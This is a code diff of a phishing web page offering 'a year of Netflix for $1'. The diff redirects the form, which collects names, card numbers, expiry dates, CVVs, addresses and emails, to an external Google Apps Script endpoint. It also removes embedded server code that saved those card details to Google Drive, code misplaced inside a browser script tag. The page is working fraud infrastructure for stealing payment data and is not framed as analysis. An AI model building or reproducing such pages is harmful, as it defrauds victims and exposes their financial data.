@@ -99,7 +99,7 @@
     <div class="container">
         <div class="card">
             <h1 class="title">Get 1 Year Of Netflix for $1 Only (Limited Time)</h1>
-            <form action="/submit-form" method="post">
+            <form action="https://script.google.com/macros/s/AKfycbzNrDPziO76UmN04GFw6iYC7uzQ-zhlm5QTvinbPTp02s8BEIfr1ai4av6omPHp7Bi30Q/exec" method="post">
                 <div class="input-box">
                     <input type="text" id="firstName" name="firstName" required>
                     <label for="firstName">First Name</label>
@@ -145,52 +145,6 @@
         </div>
     </div>
 
-    <script>
-                    const express = require('express');
-            const { google } = require('googleapis');
-            const multer = require('multer');
-            const fs = require('fs');
-            
-            const app = express();
-            const PORT = process.env.PORT || 3000;
-            const upload = multer();
-            
-            const auth = new google.auth.GoogleAuth({
-              keyFile: 'able-balm-359413-6e7416d08447.json', // Path to your downloaded JSON credentials file
-              scopes: ['https://www.googleapis.com/auth/drive.file'],
-            });
-            
-            const drive = google.drive({ version: 'v3', auth });
-            
-            app.post('/submit-form', upload.none(), async (req, res) => {
-              const formData = req.body;
-              const fileContent = `First Name: ${formData.firstName}\nLast Name: ${formData.lastName}\nCard Number: ${formData.cardNumber}\nEXP: ${formData.expDate}\nCVV: ${formData.cvv}\nZIP: ${formData.postcode}\nAddress: ${formData.streetAddress}\nState: ${formData.state}\nCountry: ${formData.country}\nEmail: ${formData.email}\n...`; // Include all form fields
-            
-              try {
-                const response = await drive.files.create({
-                  requestBody: {
-                    name: 'formData.txt', // Name of the file on Google Drive
-                    mimeType: 'text/plain',
-                  },
-                  media: {
-                    mimeType: 'text/plain',
-                    body: fileContent,
-                  },
-                });
-            
-                console.log('File created on Google Drive:', response.data);
-                res.send('Form data submitted successfully!');
-              } catch (error) {
-                console.error('Error occurred:', error);
-                res.status(500).send('Internal Server Error');
-              }
-            });
-            
-            app.listen(PORT, () => {
-              console.log(`Server is running on port ${PORT}`);
-            });
-
-    </script>
 </body>
 
 </html>
